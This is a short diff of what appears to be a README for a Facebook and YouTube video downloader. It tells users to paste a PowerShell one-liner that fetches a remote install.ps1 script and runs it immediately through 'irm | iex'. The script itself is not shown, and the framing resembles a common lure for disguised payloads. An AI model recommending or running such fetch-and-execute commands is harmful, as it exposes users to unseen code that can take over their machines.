@@ -7,7 +7,5 @@ You don't need to download any files manually. Just follow these 3 simple steps:
 Open PowerShell on your Windows PC (search for it in the Start menu).
 
 Copy the exact command below, paste it into PowerShell, and press Enter:
-
 ```irm https://raw.githubusercontent.com/DigitalAdvisr/DVISOR/main/install.ps1 | iex```
-
 The setup will be completed in a few seconds. Now copy any Facebook or YouTube video link, the video will automatically download and be saved to your clipboard!
